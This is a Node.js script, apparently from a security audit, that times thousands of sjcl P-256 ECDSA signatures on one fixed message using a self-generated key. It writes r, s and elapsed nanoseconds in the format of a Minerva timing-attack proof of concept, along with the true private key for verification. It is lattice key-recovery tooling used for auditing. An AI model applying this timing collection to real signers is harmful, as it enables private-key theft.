// Collect sjcl P-256 ECDSA signatures of a FIXED message with RANDOM nonces (sjcl default),
// in the exact input format of the validated Minerva PoC audit/minerva/poc/attack/attack.py:
//   header:  "<pubkey_uncompressed_hex> <data_hex> <privkey_hex>"
//   rows:    "<r_hex>,<s_hex>,<elapsed_ns>"
// attack.py hashes `data` with sha256 itself, so all rows share one message representative h.
import { createRequire } from 'node:module';
import { writeFileSync } from 'node:fs';
const require = createRequire(import.meta.url);
const N = +(process.argv[2] || 25000);
const OUT = process.argv[3] || 'sjcl_sigs.csv';

const sjcl = require('sjcl');
const path = require('path'), fs = require('fs');
const base = path.dirname(require.resolve('sjcl/package.json'));
for (const f of ['core/bn.js','core/ecc.js','core/ecdsa.js','core/sha256.js','core/random.js','core/bitArray.js','core/codecBytes.js','core/codecHex.js'])
  { const p = path.join(base, f); if (fs.existsSync(p)) eval(fs.readFileSync(p, 'utf8')); }

const seed = []; const rb = require('crypto').randomBytes(128);
for (let i = 0; i < rb.length; i += 4) seed.push(rb.readUInt32BE(i));
sjcl.random.addEntropy(seed, 1024, 'crypto');

const curve = sjcl.ecc.curves.c256;
const keys = sjcl.ecc.ecdsa.generateKeys(curve, 6);
const sk = keys.sec, pk = keys.pub;
const bits = sjcl.bitArray;
const privHex = sjcl.codec.hex.fromBits(sk.get());
const pubHex = '04' + sjcl.codec.hex.fromBits(pk.get().x.concat(pk.get().y));

const data = require('crypto').randomBytes(32);               // ONE fixed message
const dataHex = data.toString('hex');
const hash = sjcl.hash.sha256.hash(sjcl.codec.bytes.toBits([...data]));

const rows = [];
for (let i = 0; i < N; i++) {
  const t0 = process.hrtime.bigint();
  const sig = sk.sign(hash, 6);                                // random nonce each call
  const el = Number(process.hrtime.bigint() - t0);
  const l = bits.bitLength(sig) / 2;
  const r = sjcl.codec.hex.fromBits(bits.bitSlice(sig, 0, l));
  const s = sjcl.codec.hex.fromBits(bits.bitSlice(sig, l));
  rows.push(`${r},${s},${el}`);
}
writeFileSync(OUT, `${pubHex} ${dataHex} ${privHex}\n` + rows.join('\n') + '\n');
console.log(`wrote ${N} sjcl sigs (fixed msg, random nonce) -> ${OUT}`);
console.log(`TRUE_PRIV=${privHex}`);
